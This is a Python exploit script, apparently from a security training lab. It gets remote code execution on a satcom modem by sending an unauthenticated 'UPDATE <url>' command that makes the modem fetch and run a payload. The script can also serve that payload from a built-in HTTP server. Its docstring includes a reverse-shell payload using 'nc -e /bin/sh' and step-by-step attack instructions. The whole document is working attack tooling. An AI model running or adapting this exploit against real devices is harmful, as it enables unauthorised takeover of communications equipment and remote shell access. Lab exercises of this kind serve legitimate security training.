#!/usr/bin/env python3
"""
modem_rce.py -- Satcom Terminal Firmware Update RCE

Exploits MC-MODEM-1/2/3: the fw_update_agent on TCP 9000 accepts an
UPDATE <url> command, fetches the URL with wget, and executes the result.
No authentication. No signature check.

Usage:
  # Check modem status
  python3 modem_rce.py status

  # Send UPDATE with a known URL (payload hosted elsewhere)
  python3 modem_rce.py exploit --url http://10.0.0.1:8888/shell.sh

  # Serve a local payload file and send UPDATE to fetch it
  python3 modem_rce.py exploit --payload /tmp/shell.sh --lhost 192.168.63.10 --lport 8888

Example payload (shell.sh):
  #!/bin/sh
  id > /tmp/pwned.txt
  nc -e /bin/sh 192.168.63.10 4444

Attack path inside lab:
  1. exec into MOC container: docker exec -it spaceve1-moc bash
  2. python3 /tools/modem_rce.py status --modem 192.168.63.51
  3. python3 /tools/modem_rce.py exploit --modem 192.168.63.51 --url http://<your-ip>:8888/shell.sh
"""

import argparse
import http.server
import os
import socket
import sys
import threading


def send_command(modem_ip: str, modem_port: int, command: str) -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect((modem_ip, modem_port))
        s.sendall((command + "\n").encode())
        resp = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
        return resp.decode(errors="replace")
    finally:
        s.close()


def serve_file(path: str, host: str, port: int) -> http.server.HTTPServer:
    directory = os.path.dirname(os.path.abspath(path))

    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=directory, **kwargs)
        def log_message(self, fmt, *args):
            print(f"  [http] {fmt % args}")

    httpd = http.server.HTTPServer((host, port), Handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd


def cmd_status(args):
    print(f"  Querying {args.modem}:{args.port} ...")
    resp = send_command(args.modem, args.port, "STATUS")
    print(f"  Response:\n{resp}")


def cmd_exploit(args):
    if args.payload and not args.url:
        if not os.path.exists(args.payload):
            print(f"  Payload not found: {args.payload}")
            sys.exit(1)
        fname = os.path.basename(args.payload)
        serve_file(args.payload, args.lhost, args.lport)
        url = f"http://{args.lhost}:{args.lport}/{fname}"
        print(f"  Serving {args.payload} at {url}")
    elif args.url:
        url = args.url
    else:
        print("  Provide --payload <file> or --url <url>")
        sys.exit(1)

    print(f"  Sending: UPDATE {url}")
    resp = send_command(args.modem, args.port, f"UPDATE {url}")
    print(f"  Response:\n{resp}")


def main():
    p = argparse.ArgumentParser(description="Satcom modem firmware update RCE")
    p.add_argument("--modem", default="192.168.63.51", help="Modem IP")
    p.add_argument("--port", type=int, default=9000, help="Modem TCP port")
    sub = p.add_subparsers(dest="action")

    sub.add_parser("status", help="Query modem version and status")

    e = sub.add_parser("exploit", help="Trigger UPDATE RCE")
    e.add_argument("--payload", help="Local file to serve and execute")
    e.add_argument("--lhost", default="0.0.0.0", help="HTTP server bind address")
    e.add_argument("--lport", type=int, default=8888, help="HTTP server port")
    e.add_argument("--url", help="Direct URL for payload (skips local HTTP server)")

    args = p.parse_args()
    if args.action == "status":
        cmd_status(args)
    elif args.action == "exploit":
        cmd_exploit(args)
    else:
        p.print_help()


if __name__ == "__main__":
    main()
